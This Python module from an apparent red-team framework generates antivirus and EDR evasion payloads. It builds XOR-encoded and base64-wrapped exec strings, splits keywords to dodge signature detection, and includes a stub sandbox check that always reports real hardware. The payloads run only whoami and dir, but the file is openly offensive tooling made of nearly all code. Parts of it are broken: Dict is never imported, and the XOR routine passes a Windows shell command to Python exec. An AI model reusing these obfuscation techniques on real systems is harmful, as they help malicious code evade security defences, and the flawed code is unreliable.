import base64
import random
from autorecon_x import RedTeamModule

class EvasionEngine(RedTeamModule):
    def __init__(self, target: str):
        super().__init__(target)
        self.description = "AV/EDR Evasion: Encoding, Obfuscation, Anti-Sandbox"

    def run(self) -> Dict:
        print("[🕵️] Generating Evasive Payloads...")
        
        return {
            "techniques": [
                self._xor_encrypt(),
                self._base64_wrap(),
                self._string_mutation()
            ],
            "anti_sandbox": self._check_sandbox()
        }

    def _xor_encrypt(self, payload="cmd.exe /c whoami", key=0x42):
        enc = ''.join([chr(ord(c) ^ key) for c in payload])
        return {
            "method": "XOR Encryption",
            "code": f"key={key};decoded=''.join([chr(ord(c)^key) for c in '{enc}']);exec(decoded)"
        }

    def _base64_wrap(self):
        code = "import os;os.system('dir')"
        b64 = base64.b64encode(code.encode()).decode()
        return {
            "method": "Base64 Obfuscation",
            "code": f"exec(__import__('base64').b64decode('{b64}'))"
        }

    def _string_mutation(self):
        # Split keywords to avoid signature
        return {
            "method": "String Splitting",
            "code": "imp" + "ort o" + "s; o" + "s.sy" + "stem('who'+'ami')"
        }

    def _check_sandbox(self):
        # Check common VM indicators (RAM, CPU count, disk size)
        return {"detected": False, "note": "System looks like real hardware"}
      
